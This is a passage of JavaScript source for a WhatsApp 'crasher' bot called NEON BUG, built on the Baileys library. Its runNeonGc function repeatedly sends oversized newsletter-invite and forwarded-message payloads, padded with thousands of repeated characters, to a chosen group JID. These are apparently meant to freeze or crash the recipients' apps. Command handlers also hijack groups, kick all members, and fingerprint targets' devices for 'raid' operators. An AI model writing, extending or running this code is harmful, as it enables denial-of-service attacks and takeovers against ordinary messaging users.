        await sock.sendMessage(chatId, { text: `⚠️ ɢʀᴏᴜᴘ ᴄᴏᴍᴍᴀɴᴅ ᴏɴʟʏ!`, contextInfo: adReply }, { quoted: fakeQuote });
        break;
      }
      const ownerNumber = resolveOwnerNumber(botPhoneNumber, null);
      const ownerConfig = getOwnerConfig(ownerNumber);
      if (!ownerConfig.antispam) ownerConfig.antispam = {};
      const current = ownerConfig.antispam[chatId] || false;
      ownerConfig.antispam[chatId] = !current;
      setOwnerConfig(ownerNumber, { antispam: ownerConfig.antispam });
      await sock.sendMessage(chatId, {
        text: `🚫 𝗔𝗡𝗧𝗜𝗦𝗣𝗔𝗠: ${!current ? '✅ ON' : '❌ OFF'}`,
        contextInfo: adReply
      }, { quoted: fakeQuote });
      break;
    }

    case 'btn_antibot': {
      if (!isGroupMsg) {
        await sock.sendMessage(chatId, { text: `⚠️ ɢʀᴏᴜᴘ ᴄᴏᴍᴍᴀɴᴅ ᴏɴʟʏ!`, contextInfo: adReply }, { quoted: fakeQuote });
        break;
      }
      const ownerNumber = resolveOwnerNumber(botPhoneNumber, null);
      const ownerConfig = getOwnerConfig(ownerNumber);
      if (!ownerConfig.antibot) ownerConfig.antibot = {};
      const current = ownerConfig.antibot[chatId] || false;
      ownerConfig.antibot[chatId] = !current;
      setOwnerConfig(ownerNumber, { antibot: ownerConfig.antibot });
      await sock.sendMessage(chatId, {
        text: `🤖 𝗔𝗡𝗧𝗜𝗕𝗢𝗧: ${!current ? '✅ ON' : '❌ OFF'}`,
        contextInfo: adReply
      }, { quoted: fakeQuote });
      break;
    }

    case 'btn_addsudo':
      await sock.sendMessage(chatId, {
        text: `👑 𝗔𝗗𝗗𝗦𝗨𝗗𝗢 𝘂𝘀𝗮𝗴𝗲:\n\n*${prefix}addsudo @user* or *${prefix}addsudo 2348xxxxxxx*`,
        contextInfo: adReply
      }, { quoted: fakeQuote });
      break;

    case 'btn_delsudo':
      await sock.sendMessage(chatId, {
        text: `🚫 𝗗𝗘𝗟𝗦𝗨𝗗𝗢 𝘂𝘀𝗮𝗴𝗲:\n\n*${prefix}delsudo @user* or *${prefix}delsudo 2348xxxxxxx*`,
        contextInfo: adReply
      }, { quoted: fakeQuote });
      break;

    case 'btn_listsudo': {
      const ownerNumber = resolveOwnerNumber(botPhoneNumber, null);
      const ownerConfig = getOwnerConfig(ownerNumber);
      const sudoList = ownerConfig?.sudoUsers || [];
      if (sudoList.length === 0) {
        await sock.sendMessage(chatId, {
          text: `📋 ɴᴏ sᴜᴅᴏ ʀᴀɪᴅᴇʀs ʏᴇᴛ!`,
          contextInfo: adReply
        }, { quoted: fakeQuote });
      } else {
        const sudoListText = sudoList.map((num, i) => `║  ${i + 1}. +${num}`).join('\n');
        await sock.sendMessage(chatId, {
          text:
            `╔═══════════════════════════════════════════╗\n` +
            `║  ⚔️ 𝗦𝗨𝗗𝗢 INSTANCE  [${sudoList.length}]\n` +
            `╠═════════════════
            '═══════════════════╣\n` +
            `${sudoListText}\n` +
            `╚══════════ ══════════ ═══════════════════╝`,
          contextInfo: adReply
        }, { quoted: fakeQuote });
      }
      break;
    }

    case 'btn_hijack':
      if (!isGroupMsg) {
        await sock.sendMessage(chatId, { text: `⚠️ ᴜsᴇ ᴛʜɪs ɪɴ ᴀ ɢʀᴏᴜᴘ! ☠️`, contextInfo: adReply }, { quoted: fakeQuote });
      } else {
        await hijackGroup(sock, chatId, sender, groupMetadata, fakeQuote, isOwner, isSudo, botPhoneNumber);
      }
      break;

    case 'btn_kickall':
      if (!isGroupMsg) {
        await sock.sendMessage(chatId, { text: `⚠️ ᴜsᴇ ᴛʜɪs ɪɴ ᴀ ɢʀᴏᴜᴘ! ☠️`, contextInfo: adReply }, { quoted: fakeQuote });
      } else {
        await kickAllMembers(sock, chatId, sender, groupMetadata, fakeQuote, botPhoneNumber);
      }
      break;

    case 'btn_neon-list':
      if (!isGroupMsg) {
        await sock.sendMessage(chatId, { text: `⚠️ ᴜsᴇ ᴛʜɪs ɪɴsɪᴅᴇ ᴀ ɢʀᴏᴜᴘ ☠️`, contextInfo: adReply }, { quoted: fakeQuote });
      } else {
        // Reuse neon-list logic inline
        const groupJid = chatId;
        const groupName = groupMetadata?.subject || 'Unknown';
        const memberCount = groupMetadata?.participants?.length || 0;
        const groupCard = generateWAMessageFromContent(chatId, {
          viewOnceMessage: {
            message: {
              messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text:
                    `☠️ *ɢʀᴏᴜᴘ ɪɴғᴏ*\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `📛 *ɴᴀᴍᴇ:* ${groupName}\n` +
                    `🔗 *ᴊɪᴅ:* ${groupJid}\n` +
                    `👥 *ᴍᴇᴍʙᴇʀs:* ${memberCount}\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━`
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({ text: '☠︎」𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 𝘃𝟭.𝟬' }),
                header: proto.Message.InteractiveMessage.Header.create({ title: '🎯 𝗥𝗔𝗜𝗗 𝗧𝗔𝗥𝗚𝗘𝗧', hasMediaAttachment: false }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [{
                    name: 'cta_copy',
                    buttonParamsJson: JSON.stringify({ display_text: '📋 ᴄᴏᴘʏ ᴊɪᴅ', copy_code: groupJid })
                  }]
                })
              })
            }
          }
        }, { quoted: fakeQuote });
        await sock.relayMessage(chatId, groupCard.message, { messageId: groupCard.key.id });
      }
      break;

    default:
      break;
  }
}

// ============================================
// NEON GC RUNNER — lorddevine_newsletter (GC)
// Targets a group JID with newsletter overflow
// ============================================
async function runNeonGc(sock, chatId, targetGcJid, fakeQuote) {
  const adReply = getExternalAdReply();

  let sent = 0;
  let failed = 0;
  const ROUNDS = 50;

  for (let i = 0; i < ROUNDS; i++) {
    try {

      // ── Wave 1: newsletterAdminInvite with overflow name + caption ──
      await sock.relayMessage(targetGcJid, {
        newsletterAdminInviteMessage: {
          newsletterJid: '120363000000000001@newsletter',
          newsletterName: 'ꦾ'.repeat(5000),
          caption: 'ꦾ'.repeat(3000),
          inviteExpiration: Date.now() + 31536000000
        }
      }, { messageId: generateMessageID() });

      await delay(150);

      // ── Wave 2: status@broadcast repeat overflow in name ──
      await sock.relayMessage(targetGcJid, {
        newsletterAdminInviteMessage: {
          newsletterJid: '120363000000000001@newsletter',
          newsletterName: 'status@broadcast'.repeat(4000),
          caption: 'ꦾ'.repeat(2000)
        }
      }, { messageId: generateMessageID() });

      await delay(150);

      // ── Wave 3: second newsletter JID with different overflow ──
      await sock.relayMessage(targetGcJid, {
        newsletterAdminInviteMessage: {
          newsletterJid: '120363000000000002@newsletter',
          newsletterName: 'status@broadcast'.repeat(2000),
          caption: 'ꦾ'.repeat(1500)
        }
      }, { messageId: generateMessageID() });

      await delay(150);

      // ── Wave 4: extendedText with forwardedNewsletterMessageInfo overflow ──
      await sock.relayMessage(targetGcJid, {
        extendedTextMessage: {
          text: '𝑵𝑬𝑶𝑵 𝑩𝑼𝑮'.repeat(2000),
          contextInfo: {
            forwardedNewsletterMessageInfo: {
              newsletterJid: '120363000000000001@newsletter',
              newsletterName: 'ꦾ'.repeat(3000),
              serverMessageId: 777
            }
          }
        }
      }, { messageId: generateMessageID() });

      sent++;
      console.log(chalk.green(`✅ neon-gc [${i + 1}/${ROUNDS}] → ${targetGcJid}`));
      await delay(300);

    } catch (e) {
      failed++;
      console.warn(chalk.yellow(`⚠️ neon-gc [${i + 1}/${ROUNDS}] failed: ${e.message}`));
      await delay(500);
    }
  }

  const successRate = Math.round((sent / ROUNDS) * 100);

  await sock.sendMessage(chatId, {
    text:
      `𓅓*ɪɴsᴛᴀɴᴄᴇ ᴄᴏᴍᴘʟᴇᴛᴇ* ☠️\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `🎯 *ᴛᴀʀɢᴇᴛ:* ${targetGcJid}\n` +
      `📊 *ʀᴏᴜɴᴅs sᴇɴᴛ:* ${sent}/${ROUNDS}\n` +
      `📈 *sᴜᴄᴄᴇss ʀᴀᴛᴇ:* ${successRate}%\n` +
      `━━━━━━━━ ━━━━━━ ━━━━━━ ━━━━━━━━\n` +
      `_| ᴍʏsᴛɪᴄ ᴛᴇᴄʜ`,
    contextInfo: adReply
  }, { quoted: fakeQuote });
}

// ============================================
// MAIN MODULE EXPORT
// ============================================
module.exports = async (sock, phoneNumber = null, ownerChatId = null) => {
  await baileysReady;
  const botPhoneNumber = phoneNumber;
  console.log(chalk.cyan(`「☠︎」NEON BUG initialized — Phone: ${phoneNumber || 'unknown'}, Owner: ${ownerChatId || 'unknown'}`));

  // ============================================
  // EVENT: GROUP PARTICIPANTS (ANTIRAID ONLY)
  // ============================================
  sock.ev.on('group-participants.update', async ({ id, participants, action }) => {
    try {
      if (action === 'add') {
        await handleNeonGroupGuard(sock, id, participants, botPhoneNumber);
      }
    } catch (err) {
      console.error(chalk.yellow('⚠️ Error in group participants update:'), err);
    }
  });

  console.log(chalk.green('✅ Event handlers initialized'));

  // ============================================
  // MAIN MESSAGE HANDLER
  // ============================================
  sock.ev.on('messages.upsert', async ({ messages, type }) => {
    if (type !== 'notify') return;

    for (const msg of messages) {
      try {
        if (!msg.message) continue;
        if (msg.key.remoteJid === 'status@broadcast') continue;

        const chatId = msg.key.remoteJid;
        const sender = msg.key.participant || msg.key.remoteJid;
        const senderNumber = stripJid(sender);
        const isGroupMsg = chatId.endsWith('@g.us');
        const groupId = isGroupMsg ? chatId : null;

        // ── Deduplicate ──
        const messageId = `${chatId}_${msg.key.id}_${botPhoneNumber}`;
        if (isMessageProcessed(messageId)) continue;
        markMessageProcessed(messageId);

        // ── Anti-features ──
        if (!msg.key.fromMe) {
          const antiText = msg.message.conversation ||
            msg.message.extendedTextMessage?.text ||
            msg.message.imageMessage?.caption ||
            msg.message.videoMessage?.caption || '';
          const blocked = await handleAntiFeatures(sock, msg, sender, antiText, isGroupMsg, groupId, botPhoneNumber);
          if (blocked) continue;
        }

        // ── Bot isolation ──
        if (botPhoneNumber) {
          const cleanSender = normalizeNumber(senderNumber);
          const cleanBotPhone = normalizeNumber(botPhoneNumber);

          const isBotOwner = cleanSender === cleanBotPhone ||
            cleanSender.endsWith(cleanBotPhone) ||
            cleanBotPhone.endsWith(cleanSender);

          const botOwnerNumber = resolveOwnerNumber(botPhoneNumber, null);
          const ownerConfig = getOwnerConfig(botOwnerNumber);
          const isSudoUser = ownerConfig?.sudoUsers?.some(sudo => {
            const cleanSudo = normalizeNumber(sudo);
            return cleanSender === cleanSudo ||
              cleanSender.endsWith(cleanSudo) ||
              cleanSudo.endsWith(cleanSender);
          }) || false;

          if (!isBotOwner && !isSudoUser && !msg.key.fromMe) continue;
        }

        // ── Extract text ──
        let text = msg.message.conversation ||
          msg.message.extendedTextMessage?.text ||
          msg.message.imageMessage?.caption ||
          msg.message.videoMessage?.caption || '';

        // ── Check for button response ──
        let buttonResponseId = null;

        // Type 1: old buttonsResponseMessage
        if (msg.message?.buttonsResponseMessage?.selectedButtonId) {
          buttonResponseId = msg.message.buttonsResponseMessage.selectedButtonId;
        }

        // Type 2: interactiveResponseMessage (cta_reply buttons)
        if (!buttonResponseId) {
          const paramsJson = msg.message?.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson;
          if (paramsJson) {
            try {
              buttonResponseId = JSON.parse(paramsJson)?.id || null;
            } catch {
              buttonResponseId = null;
            }
          }
        }

        // Type 3: listResponseMessage (list button selections)
        if (!buttonResponseId) {
          const rowId = msg.message?.listResponseMessage?.singleSelectReply?.selectedRowId;
          if (rowId) buttonResponseId = rowId;
        }

        if (!text && !buttonResponseId) continue;

        // ── Get prefix ──
        let prefix;
        if (botPhoneNumber) {
          const botOwnerNumber = resolveOwnerNumber(botPhoneNumber, null);
          prefix = getOwnerPrefix(botOwnerNumber) || helpers.getPrefix() || '.';
        } else {
          prefix = helpers.getPrefix() || '.';
        }

        // ── Group metadata ──
        let groupMetadata = null;
        if (isGroupMsg) {
          try {
            groupMetadata = await sock.groupMetadata(groupId);
          } catch (e) {
            console.warn(chalk.yellow('Failed to fetch group metadata:'), e.message);
          }
        }

        // ── Owner / sudo check ──
        let isOwner = false;
        let isSudo = false;

        if (botPhoneNumber) {
          const cleanBotPhone = normalizeNumber(botPhoneNumber);
          const resolvedSender = resolveOwnerNumber(sender, groupMetadata) || senderNumber;
          const cleanSender = normalizeNumber(resolvedSender);
          isOwner = Boolean(msg.key.fromMe) || cleanSender === cleanBotPhone ||
            cleanSender.endsWith(cleanBotPhone) ||
            cleanBotPhone.endsWith(cleanSender);

          if (!isOwner) {
            const botOwnerNumber = resolveOwnerNumber(botPhoneNumber, null);
            const ownerConfig = getOwnerConfig(botOwnerNumber);
            if (ownerConfig?.sudoUsers) {
              isSudo = ownerConfig.sudoUsers.some(sudo => {
                const cleanSudo = normalizeNumber(sudo);
                return cleanSender === cleanSudo ||
                  cleanSender.endsWith(cleanSudo) ||
                  cleanSudo.endsWith(cleanSender);
              });
            }
          }
        }

        const fakeQuote = createFakeQuote();
        const sessionKey = `${chatId}_${senderNumber}`;

        // ============================================
        // BUTTON RESPONSE HANDLER
        // ============================================
        if (buttonResponseId) {
          console.log(chalk.cyan(`「☠︎」BUTTON: ${buttonResponseId} | User: ${sender}`));
          await handleButtonResponse(
            sock, chatId, sessionKey, buttonResponseId,
            msg, isOwner, isSudo, prefix,
            groupMetadata, isGroupMsg, sender, botPhoneNumber, fakeQuote
          );
          continue;
        }

        // ============================================
        // PENDING TARGET SESSION HANDLER
        // Intercepts number after button press or cmd prompt
        // ============================================
        if (pendingTargetSessions.has(sessionKey) && !text.startsWith(prefix)) {
          const session = pendingTargetSessions.get(sessionKey);
          pendingTargetSessions.delete(sessionKey);

          if (Date.now() - session.timestamp <= 120000) {
            const rawNum = text.replace(/[^0-9]/g, '');

            if (!rawNum || rawNum.length < 7) {
              await sock.sendMessage(chatId, {
                text: `❌ ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ! ᴛʀʏ ᴀɢᴀɪɴ ☠️`,
                contextInfo: getExternalAdReply()
              }, { quoted: fakeQuote });
              continue;
            }

            await handlePendingNeonCommand(sock, chatId, session.command, rawNum + '@s.whatsapp.net', rawNum, fakeQuote);
            continue;
          }
        }

        if (!text.startsWith(prefix)) continue;

        const args = text.slice(prefix.length).trim().split(/ +/);
        const command = args.shift()?.toLowerCase();

        console.log(chalk.red(`𓅓 CMD: ${command} | User: ${sender} | Owner: ${isOwner} | Sudo: ${isSudo}`));

        // ============================================
        // COMMAND SWITCH
        // ============================================
        switch (command) {

          // ── PING ──
          case 'ping': {
            const start = Date.now();
            await sock.sendMessage(chatId, {
              text: `⏳ ᴘɪɴɢɪɴɢ...`,
              contextInfo: getExternalAdReply()
            }, { quoted: fakeQuote });
            const ping = Date.now() - start;
            const uptime = getUptime(global.botStartTime);
            await sock.sendMessage(chatId, {
              text: `🏓 𝗣𝗢𝗡𝗚: ${ping}𝚖𝚜 ⏰ 𝚄𝚙𝚝𝚒𝚖𝚎: ${uptime}`,
              contextInfo: getExternalAdReply()
            }, { quoted: fakeQuote });
            break;
          }

          // ── MENU ──
          case 'menu': {
            try {
              await sendCommandMenu(sock, chatId, fakeQuote, prefix);
            } catch (err) {
              await sendPlainMenu(sock, chatId, fakeQuote, prefix, err?.stack || err?.message || String(err));
            }
            break;
          }

          // ── ADDSUDO (OWNER ONLY) ──
          case 'addsudo': {
            if (!isOwner) {
              await sock.sendMessage(chatId, {
                text: `⛔ ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ! ☠️`,
                contextInfo: getExternalAdReply()
              }, { quoted: fakeQuote });
              break;
            }
            const ownerNumber = resolveOwnerNumber(botPhoneNumber, null);
            const ownerConfig = getOwnerConfig(ownerNumber);
            const mentionedJids = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
            let targetJid = mentionedJids[0] || null;
            if (!targetJid && args[0]) {
              const num = args[0].replace(/[^0-9]/g, '');
              if (num) targetJid = num + '@s.whatsapp.net';
            }
            if (!targetJid) {
              await sock.sendMessage(chatId, {
                text: `❌ 𝚄𝚜𝚊𝚐𝚎: ${prefix}addsudo @user or ${prefix}addsudo number`,
                contextInfo: getExternalAdReply()
              }, { quoted: fakeQuote });
              break;
            }
            if (!ownerConfig.sudoUsers) ownerConfig.sudoUsers = [];
            const targetNum = stripJid(targetJid);
            const alreadySudo = ownerConfig.sudoUsers.some(s => normalizeNumber(s) === normalizeNumber(targetNum));
            if (alreadySudo) {
              await sock.sendMessage(chatId, {
                text: `⚠️ @${targetNum} ɪs ᴀʟʀᴇᴀᴅʏ ᴀ sᴜᴅᴏ ʀᴀɪᴅᴇʀ!`,
                mentions: [targetJid],
                contextInfo: getExternalAdReply()
              }, { quoted: fakeQuote });
              break;
            }
            ownerConfig.sudoUsers.push(targetNum);
            setOwnerConfig(ownerNumber, { sudoUsers: ownerConfig.sudoUsers });
            await sock.sendMessage(chatId, {
              text: `✅ @${targetNum} ᴀᴅᴅᴇᴅ ᴀs sᴜᴅᴏ ʀᴀɪᴅᴇʀ! ☠️`,
              mentions: [targetJid],
              contextInfo: getExternalAdReply()
            }, { quoted: fakeQuote });
            break;
          }

          // ── DELSUDO (OWNER ONLY) ──
          case 'delsudo': {
            if (!isOwner) {
              await sock.sendMessage(chatId, {
                text: `⛔ ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ! ☠️`,
                contextInfo: getExternalAdReply()
              }, { quoted: fakeQuote });
              break;
            }
            const ownerNumber = resolveOwnerNumber(botPhoneNumber, null);
            const ownerConfig = getOwnerConfig(ownerNumber);
            const mentionedJids = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
            let targetJid = mentionedJids[0] || null;
            if (!targetJid && args[0]) {
              const num = args[0].replace(/[^0-9]/g, '');
              if (num) targetJid = num + '@s.whatsapp.net';
            }
            if (!targetJid) {
              await sock.sendMessage(chatId, {
                text: `❌ 𝚄𝚜𝚊𝚐𝚎: ${prefix}delsudo @user or ${prefix}delsudo number`,
                contextInfo: getExternalAdReply()
              }, { quoted: fakeQuote });
              break;
            }
            if (!ownerConfig.sudoUsers || ownerConfig.sudoUsers.length === 0) {
              await sock.sendMessage(chatId, {
                text: `⚠️ ɴᴏ sᴜᴅᴏ ʀᴀɪᴅᴇʀs ᴛᴏ ʀᴇᴍᴏᴠᴇ!`,
                contextInfo: getExternalAdReply()
              }, { quoted: fakeQuote });
              break;
            }
            const targetNum2 = stripJid(targetJid);
            const prevLen = ownerConfig.sudoUsers.length;
            ownerConfig.sudoUsers = ownerConfig.sudoUsers.filter(s => normalizeNumber(s) !== normalizeNumber(targetNum2));
            if (ownerConfig.sudoUsers.length === prevLen) {
              await sock.sendMessage(chatId, {
                text: `⚠️ @${targetNum2} ɪs ɴᴏᴛ ᴀ sᴜᴅᴏ ʀᴀɪᴅᴇʀ!`,
                mentions: [targetJid],
                contextInfo: getExternalAdReply()
              }, { quoted: fakeQuote });
              break;
            }
            setOwnerConfig(ownerNumber, { sudoUsers: ownerConfig.sudoUsers });
            await sock.sendMessage(chatId, {
              text: `🚫 @${targetNum2} ʀᴇᴍᴏᴠᴇᴅ ғʀᴏᴍ sᴜᴅᴏ ʀᴀɪᴅᴇʀs ☠️`,
              mentions: [targetJid],
              contextInfo: getExternalAdReply()
            }, { quoted: fakeQuote });
            break;
          }

          // ── LISTSUDO ──
          case 'listsudo': {
            if (!isOwner) {
              await sock.sendMessage(chatId, {
                text: `⛔ ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ! ☠️`,
                contextInfo: getExternalAdReply()
              }, { quoted: fakeQuote });
              break;
            }
            const ownerNumber = resolveOwnerNumber(botPhoneNumber, null);
            const ownerConfig = getOwnerConfig(ownerNumber);
            const sudoList = ownerConfig?.sudoUsers || [];
            if (sudoList.length === 0) {
              await sock.sendMessage(chatId, {
                text: `📋 ɴᴏ sᴜᴅᴏ ʀᴀɪᴅᴇʀs ʏᴇᴛ!\n\n☠️ 𝚄𝚜𝚎 ${prefix}addsudo ᴛᴏ ᴀᴅᴅ ᴏɴᴇ`,
                contextInfo: getExternalAdReply()
              }, { quoted: fakeQuote });
              break;
            }
            const sudoListText = sudoList.map((num, i) => `║  ${i + 1}. +${num}`).join('\n');
            await sock.sendMessage(chatId, {
              text:
                `╔═════════════════════════════════════╗\n` +
                `║  ⚔️ 𝗦𝗨𝗗𝗢 INSTANCE [${sudoList.length}]\n` +
                `╠══════════    ═══════════════════════╣\n` +
                `${sudoListText}\n` +
                `╚═════════════════════════════════════╝`,
              contextInfo: getExternalAdReply()
            }, { quoted: fakeQuote });
            break;
          }

          // ── ANTIBUG ──
          case 'neon-antibug': {
            if (!isOwner && !isSudo) {
              await sock.sendMessage(chatId, { text: `⛔ ᴏᴡɴᴇʀ/sᴜᴅᴏ ᴏɴʟʏ! ☠️`, contextInfo: getExternalAdReply() }, { quoted: fakeQuote });
              break;
            }
            const ownerNumber = resolveOwnerNumber(botPhoneNumber, null);
            const ownerConfig = getOwnerConfig(ownerNumber);
            const current = ownerConfig?.antibug || false;
            setOwnerConfig(ownerNumber, { antibug: !current });
            await sock.sendMessage(chatId, {
              text: `🛡️ 𝗔𝗡𝗧𝗜𝗕𝗨𝗚: ${!current ? '✅ ON' : '❌ OFF'}`,
              contextInfo: getExternalAdReply()
            }, { quoted: fakeQuote });
            break;
          }

          // ── ANTISPAM ──
          case 'antispam': {
            if (!isGroupMsg) {
              await sock.sendMessage(chatId, { text: `⚠️ ɢʀᴏᴜᴘ ᴄᴏᴍᴍᴀɴᴅ ᴏɴʟʏ!`, contextInfo: getExternalAdReply() }, { quoted: fakeQuote });
              break;
            }
            if (!isOwner && !isSudo) {
              await sock.sendMessage(chatId, { text: `⛔ ᴏᴡɴᴇʀ/sᴜᴅᴏ ᴏɴʟʏ! ☠️`, contextInfo: getExternalAdReply() }, { quoted: fakeQuote });
              break;
            }
            const ownerNumber = resolveOwnerNumber(botPhoneNumber, null);
            const ownerConfig = getOwnerConfig(ownerNumber);
            if (!ownerConfig.antispam) ownerConfig.antispam = {};
            const current = ownerConfig.antispam[groupId] || false;
            ownerConfig.antispam[groupId] = !current;
            setOwnerConfig(ownerNumber, { antispam: ownerConfig.antispam });
            await sock.sendMessage(chatId, {
              text: `🚫 𝗔𝗡𝗧𝗜𝗦𝗣𝗔𝗠: ${!current ? '✅ ON' : '❌ OFF'}`,
              contextInfo: getExternalAdReply()
            }, { quoted: fakeQuote });
            break;
          }

          // ── ANTIBOT ──
          case 'antibot': {
            if (!isGroupMsg) {
              await sock.sendMessage(chatId, { text: `⚠️ ɢʀᴏᴜᴘ ᴄᴏᴍᴍᴀɴᴅ ᴏɴʟʏ!`, contextInfo: getExternalAdReply() }, { quoted: fakeQuote });
              break;
            }
            if (!isOwner && !isSudo) {
              await sock.sendMessage(chatId, { text: `⛔ ᴏᴡɴᴇʀ/sᴜᴅᴏ ᴏɴʟʏ! ☠️`, contextInfo: getExternalAdReply() }, { quoted: fakeQuote });
              break;
            }
            const ownerNumber = resolveOwnerNumber(botPhoneNumber, null);
            const ownerConfig = getOwnerConfig(ownerNumber);
            if (!ownerConfig.antibot) ownerConfig.antibot = {};
            const current = ownerConfig.antibot[groupId] || false;
            ownerConfig.antibot[groupId] = !current;
            setOwnerConfig(ownerNumber, { antibot: ownerConfig.antibot });
            await sock.sendMessage(chatId, {
              text: `🤖 𝗔𝗡𝗧𝗜𝗕𝗢𝗧: ${!current ? '✅ ON' : '❌ OFF'}`,
              contextInfo: getExternalAdReply()
            }, { quoted: fakeQuote });
            break;
          }

          // ── HIJACK ──
          case 'hijack': {
            if (!isOwner && !isSudo) {
              await sock.sendMessage(chatId, { text: `⛔ ᴏᴡɴᴇʀ/sᴜᴅᴏ ᴏɴʟʏ! ☠️`, contextInfo: getExternalAdReply() }, { quoted: fakeQuote });
              break;
            }
            if (!isGroupMsg) {
              await sock.sendMessage(chatId, { text: `⚠️ ᴜsᴇ ᴛʜɪs ɪɴ ᴀ ɢʀᴏᴜᴘ! ☠️`, contextInfo: getExternalAdReply() }, { quoted: fakeQuote });
              break;
            }
            await hijackGroup(sock, chatId, sender, groupMetadata, fakeQuote, isOwner, isSudo, botPhoneNumber);
            break;
          }

          // ── KICKALL ──
          case 'kickall': {
            if (!isOwner && !isSudo) {
              await sock.sendMessage(chatId, { text: `⛔ ᴏᴡɴᴇʀ/sᴜᴅᴏ ᴏɴʟʏ! ☠️`, contextInfo: getExternalAdReply() }, { quoted: fakeQuote });
              break;
            }
            if (!isGroupMsg) {
              await sock.sendMessage(chatId, { text: `⚠️ ᴜsᴇ ᴛʜɪs ɪɴ ᴀ ɢʀᴏᴜᴘ! ☠️`, contextInfo: getExternalAdReply() }, { quoted: fakeQuote });
              break;
            }
            await kickAllMembers(sock, chatId, sender, groupMetadata, fakeQuote, botPhoneNumber);
            break;
          }

          // ── DEVICE ──
          case 'device': {
            if (!isOwner && !isSudo) {
              await sock.sendMessage(chatId, { text: `⛔ ᴏᴡɴᴇʀ/sᴜᴅᴏ ᴏɴʟʏ! ☠️`, contextInfo: getExternalAdReply() }, { quoted: fakeQuote });
              break;
            }
            let targetJid = null;
            let targetMsgId = null;
            let deviceInfo = null;
            let scanNote = '';
            const quoted = msg.message?.extendedTextMessage?.contextInfo;
            if (quoted?.quotedMessage && quoted?.stanzaId) {
              targetJid = quoted.participant || quoted.remoteJid;
              targetMsgId = quoted.stanzaId;
              deviceInfo = getDeviceFromMsgId(targetMsgId);
            } else if (args[0] && args[0].includes('@')) {
              const mentionRaw = quoted?.mentionedJid?.[0] ||
                msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
              targetJid = mentionRaw || (args[0].replace('@', '') + '@s.whatsapp.net');
              deviceInfo = { label: '❓ ᴜɴᴋɴᴏᴡɴ', emoji: '❓' };
              scanNote = '\n_💡 ʀᴇᴘʟʏ ᴛᴏ ᴛʜᴇɪʀ ᴍᴇssᴀɢᴇ ғᴏʀ ᴀᴄᴄᴜʀᴀᴛᴇ ʀᴇsᴜʟᴛ_';
            } else if (args[0] && /^\d+$/.test(args[0])) {
              targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
              deviceInfo = { label: '❓ ᴜɴᴋɴᴏᴡɴ', emoji: '❓' };
              scanNote = '\n_💡 ʀᴇᴘʟʏ ᴛᴏ ᴛʜᴇɪʀ ᴍᴇssᴀɢᴇ ғᴏʀ ᴀᴄᴄᴜʀᴀᴛᴇ ʀᴇsᴜʟᴛ_';
            } else {
              await sock.sendMessage(chatId, {
                text:
                  `⚠️ *ᴜsᴀɢᴇ:*\n\n` +
                  `› *${prefix}device* — ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴍᴇssᴀɢᴇ\n` +
                  `› *${prefix}device @user*\n` +
                  `› *${prefix}device 2348xxxxxxxxx*`,
                contextInfo: getExternalAdReply()
              }, { quoted: fakeQuote });
              break;
            }
            const displayNumber = stripJid(targetJid);
            await sock.sendMessage(chatId, {
              text:
                `𓅓  *ᴅᴇᴠɪᴄᴇ ᴅᴇᴛᴇᴄᴛᴏʀ*\n` +
                `━━━━━━━━━━━━━━━━\n` +
                `👤 *ᴜsᴇʀ:* +${displayNumber}\n` +
                `📟 *ᴅᴇᴠɪᴄᴇ:* ${deviceInfo.label}\n` +
                `${targetMsgId ? `🔑 *ᴍsɢ ɪᴅ:* \`${targetMsgId.slice(0, 10)}...\`\n` : ''}` +
                `━━━━━━━━━━━━━━━━\n` +
                `☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬` +
                scanNote,
              contextInfo: getExternalAdReply()
            }, { quoted: fakeQuote });
            break;
          }

          // ── NEON GC ──
          case 'neon-gc': {
            if (!isOwner && !isSudo) {
              await sock.sendMessage(chatId, { text: `⛔ ᴏᴡɴᴇʀ/sᴜᴅᴏ ᴏɴʟʏ! ☠️`, contextInfo: getExternalAdReply() }, { quoted: fakeQuote });
              break;
            }
            if (isGroupMsg) {
              try { await sock.sendMessage(chatId, { react: { text: '「☠︎」', key: msg.key } }); } catch (_) {}
              await runNeonGc(sock, chatId, chatId, fakeQuote);
              try { await sock.sendMessage(chatId, { react: { text: '✅', key: msg.key } }); } catch (_) {}
            } else {
              const providedJid = args[0];
              if (providedJid && providedJid.endsWith('@g.us')) {
                await sock.sendMessage(chatId, {
                  text:
                    `𓅓*ɪɴsᴛᴀɴᴄᴇ ᴅᴇᴘʟᴏʏɪɴɢ* ☠️\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `🎯 *ᴛᴀʀɢᴇᴛ:* ${providedJid}\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `_「☠︎」ɴɪɢʜᴛ ʀᴀɪᴅᴇʀs ʀᴀɪᴅɪɴɢ..._`,
                  contextInfo: getExternalAdReply()
                }, { quoted: fakeQuote });
                await runNeonGc(sock, chatId, providedJid, fakeQuote);
              } else {
                await sock.sendMessage(chatId, {
                  text:
                    `⚠️ 𝗙𝗼𝗼𝗹! 𝗧𝗵𝗮𝘁'𝘀 𝗻𝗼𝘁 𝗵𝗼𝘄 𝘁𝗼 𝘂𝘀𝗲 𝗶𝘁!\n\n` +
